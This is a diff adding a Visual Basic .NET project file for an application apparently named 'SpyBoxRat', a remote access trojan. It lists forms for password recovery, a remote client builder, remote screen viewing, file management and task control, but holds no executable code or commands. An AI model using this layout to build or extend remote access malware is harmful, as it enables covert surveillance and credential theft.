@@ -1,0 +1,313 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{27614F8E-CC1B-40DB-973B-75F4173DAF9E}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <StartupObject>AnonMon.My.MyApplication</StartupObject>
+    <RootNamespace>AnonMon</RootNamespace>
+    <AssemblyName>SpyBoxRat</AssemblyName>
+    <FileAlignment>512</FileAlignment>
+    <MyType>WindowsForms</MyType>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DefineDebug>true</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DocumentationFile>SpyBoxRat.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <DefineDebug>false</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DocumentationFile>SpyBoxRat.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionExplicit>On</OptionExplicit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionCompare>Binary</OptionCompare>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionStrict>Off</OptionStrict>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionInfer>On</OptionInfer>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>Arsium-Spartan.ico</ApplicationIcon>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x64'">
+    <DebugSymbols>true</DebugSymbols>
+    <DefineDebug>true</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <OutputPath>bin\x64\Debug\</OutputPath>
+    <DocumentationFile>SpyBoxRat.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+    <DebugType>full</DebugType>
+    <PlatformTarget>x64</PlatformTarget>
+    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
+    <Prefer32Bit>true</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x64'">
+    <DefineTrace>true</DefineTrace>
+    <OutputPath>bin\x64\Release\</OutputPath>
+    <DocumentationFile>SpyBoxRat.xml</DocumentationFile>
+    <Optimize>true</Optimize>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+    <DebugType>pdbonly</DebugType>
+    <PlatformTarget>x64</PlatformTarget>
+    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
+    <Prefer32Bit>true</Prefer32Bit>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="HZH_Controls">
+      <HintPath>C:\Users\mehdi\Documents\UI DLL\HZH_Controls.dll</HintPath>
+    </Reference>
+    <Reference Include="MKWFGA">
+      <HintPath>..\..\Monitoring\Fury Monitor\bin\Debug\MKWFGA.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Design" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="XanderUI">
+      <HintPath>C:\Users\mehdi\Documents\UI DLL\XanderUI.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <Import Include="Microsoft.VisualBasic" />
+    <Import Include="System" />
+    <Import Include="System.Collections" />
+    <Import Include="System.Collections.Generic" />
+    <Import Include="System.Data" />
+    <Import Include="System.Drawing" />
+    <Import Include="System.Diagnostics" />
+    <Import Include="System.Windows.Forms" />
+    <Import Include="System.Linq" />
+    <Import Include="System.Xml.Linq" />
+    <Import Include="System.Threading.Tasks" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Classes\BuilderClass.vb" />
+    <Compile Include="Classes\Countries.vb" />
+    <Compile Include="Classes\Helper.vb" />
+    <Compile Include="Forms\Custom_Form.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FileManager_Form.Designer.vb">
+      <DependentUpon>FileManager_Form.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FileManager_Form.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\Form1.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\Form1.Designer.vb">
+      <DependentUpon>Form1.vb</DependentUpon>
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\Info_Form.Designer.vb">
+      <DependentUpon>Info_Form.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\Info_Form.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\PassRecov_Form.Designer.vb">
+      <DependentUpon>PassRecov_Form.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\PassRecov_Form.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\REMOTE_BUILDER.Designer.vb">
+      <DependentUpon>REMOTE_BUILDER.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\REMOTE_BUILDER.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\RViewerForm.Designer.vb">
+      <DependentUpon>RViewerForm.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\RViewerForm.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\Tasks_Form.Designer.vb">
+      <DependentUpon>Tasks_Form.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\Tasks_Form.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="My Project\AssemblyInfo.vb" />
+    <Compile Include="My Project\Application.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Application.myapp</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <Compile Include="My Project\Resources.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Settings.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Classes\SenderHelper.vb" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Forms\Custom_Form.resx">
+      <DependentUpon>Custom_Form.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FileManager_Form.resx">
+      <DependentUpon>FileManager_Form.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\Form1.resx">
+      <DependentUpon>Form1.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\Info_Form.resx">
+      <DependentUpon>Info_Form.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\PassRecov_Form.resx">
+      <DependentUpon>PassRecov_Form.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\REMOTE_BUILDER.resx">
+      <DependentUpon>REMOTE_BUILDER.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\RViewerForm.resx">
+      <DependentUpon>RViewerForm.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\Tasks_Form.resx">
+      <DependentUpon>Tasks_Form.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="My Project\Resources.resx">
+      <Generator>VbMyResourcesResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.vb</LastGenOutput>
+      <CustomToolNamespace>My.Resources</CustomToolNamespace>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="My Project\Application.myapp">
+      <Generator>MyApplicationCodeGenerator</Generator>
+      <LastGenOutput>Application.Designer.vb</LastGenOutput>
+    </None>
+    <None Include="My Project\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <CustomToolNamespace>My</CustomToolNamespace>
+      <LastGenOutput>Settings.Designer.vb</LastGenOutput>
+    </None>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="Arsium-Spartan.ico" />
+    <Content Include="iconfinder_anonymous_395266s.ico" />
+    <None Include="Resources\icons8_downloassd_32.png" />
+    <None Include="Resources\icons8_skull_crossqdsbones_32.png" />
+    <None Include="Resources\icons8_refresh_32.png" />
+    <None Include="Resources\iconfinder_mouse_delete_84782.png" />
+    <None Include="Resources\icons8_move_32.png" />
+    <None Include="Resources\icons8_mouse_right_click_641.png" />
+    <None Include="Resources\icons8_left_cgglick_32.png" />
+    <None Include="Resources\icons8_moussdfsdfe.ico" />
+    <None Include="Resources\icons8_shutdown_64.png" />
+    <None Include="Resources\hardware.png" />
+    <None Include="Resources\icons8_padlosqdck_64.png" />
+    <None Include="Resources\icons8_locks_64.png" />
+    <None Include="Resources\icons8_keyboards_64.png" />
+    <None Include="Resources\icons8_windows_cliegnt_32.png" />
+    <None Include="Resources\icons8_stop_64.png" />
+    <None Include="Resources\icons8_record_64.png" />
+    <None Include="Resources\icons8_windows_nclient_64.png" />
+    <None Include="Resources\icons8_windows_cliefghfgnt_64.png" />
+    <None Include="Resources\icons8_swap_64.png" />
+    <None Include="Resources\icons8_mouse_right_click_64.png" />
+    <None Include="Resources\icons8_edye1.ico" />
+    <None Include="Resources\icons8_hide1.ico" />
+    <None Include="Resources\icons8_hide.ico" />
+    <None Include="Resources\icons8_edye.ico" />
+    <None Include="Resources\icons8_hide_16.png" />
+    <None Include="Resources\icons8_minimize_window_641.png" />
+    <None Include="Resources\Arsium-Spartan.ico" />
+    <None Include="Resources\icons8_hide_321.png" />
+    <None Include="Resources\icons8_edye_32.png" />
+    <None Include="Resources\icons8_hide_32.png" />
+    <None Include="Resources\icons8_minimize_window_322.png" />
+    <None Include="Resources\icons8_switch_on_32.png" />
+    <None Include="Resources\icons8_switch_on_64.png" />
+    <None Include="Resources\icons8_minimize_window_64.png" />
+    <None Include="Resources\me-too.wav" />
+    <None Include="Icons\icons8_info_zedzepopup_32.png" />
+    <None Include="Icons\icons8_mouse_right_click_64.png" />
+    <None Include="Icons\icons8_swap_64.png" />
+    <None Include="Icons\a1a5b9494d50bb3754bba547f2d88487-computer-monitor-flat-icon-bmpy-vexels %281%29.png" />
+    <None Include="Icons\icons8_key.ico" />
+    <None Include="Icons\icons8_settinpmgs.ico" />
+    <None Include="Icons\icons8_spyqsqs.ico" />
+    <None Include="Icons\icons8_toolbox1235.ico" />
+    <None Include="Icons\folder_IC.ico" />
+    <None Include="Icons\icons8_system_task.ico" />
+    <None Include="Icons\icons8_pictures_folder.ico" />
+    <None Include="Icons\icons8_poisqsdqsdon.ico" />
+    <None Include="Icons\icons8_lightning_boltsds.ico" />
+    <None Include="Icons\ichcons8_speech_bubble - Copie.ico" />
+    <None Include="Icons\icons8_wi-qsdqs69fi.ico" />
+    <None Include="Icons\icons8_info_zedzepopup.ico" />
+    <None Include="Icons\icons8_logout_rounded_left.ico" />
+    <None Include="Icons\icons8sds_restart.ico" />
+    <None Include="Icons\icons8_arrow_right_go.ico" />
+    <None Include="Icons\icons8_arrow_left_back.ico" />
+    <None Include="Icons\icons8_trashsa.ico" />
+    <None Include="Icons\icons8_enter.ico" />
+    <None Include="Icons\icons8_delete.ico" />
+    <Content Include="LOGO.ico" />
+    <None Include="Icons\icons8_pictures_folder_32.png" />
+    <None Include="Icons\icons8_windows_client_32.png" />
+    <None Include="Icons\icons8_recordstart_32.png" />
+    <None Include="Icons\icons8_stopsquare_32.png" />
+    <None Include="Icons\icons8_enter_32.png" />
+    <None Include="Icons\icons8_logout_rounded_left_32.png" />
+    <None Include="Icons\icons8_arrow_left_back_32.png" />
+    <None Include="Icons\icons8_arrow_right_go_32.png" />
+    <None Include="Icons\icons8_wi-qsdqs69fi_32.png" />
+    <None Include="Icons\ichcons8_speech_bubble_32.png" />
+    <None Include="Icons\icons8_spyqsqs_32.png" />
+    <None Include="Icons\icons8_toolbox_64.png" />
+    <None Include="Icons\a1a5b9494d50bb3754bba547f2d88487-computer-monitor-flat-icon-by-vexels.png" />
+    <None Include="Icons\SHELL32_1_167.png" />
+    <None Include="Icons\icons8_shutdownS_32.png" />
+    <None Include="Icons\icons8sds_restart_32.png" />
+    <None Include="Icons\icons8_lightning_boltsds_32.png" />
+    <None Include="Icons\icons8_system_task_32.png" />
+    <None Include="Icons\icons8_delete_32.png" />
+    <None Include="Icons\icons8_trashsa_32.png" />
+    <None Include="Icons\icons8_settinpmgs_32.png" />
+    <None Include="Icons\icons8_poisqsdqsdon_32.png" />
+    <None Include="Icons\icons8_key_64.png" />
+    <None Include="Icons\folder_IC.png" />
+    <None Include="Resources\folder.png" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
+</Project>
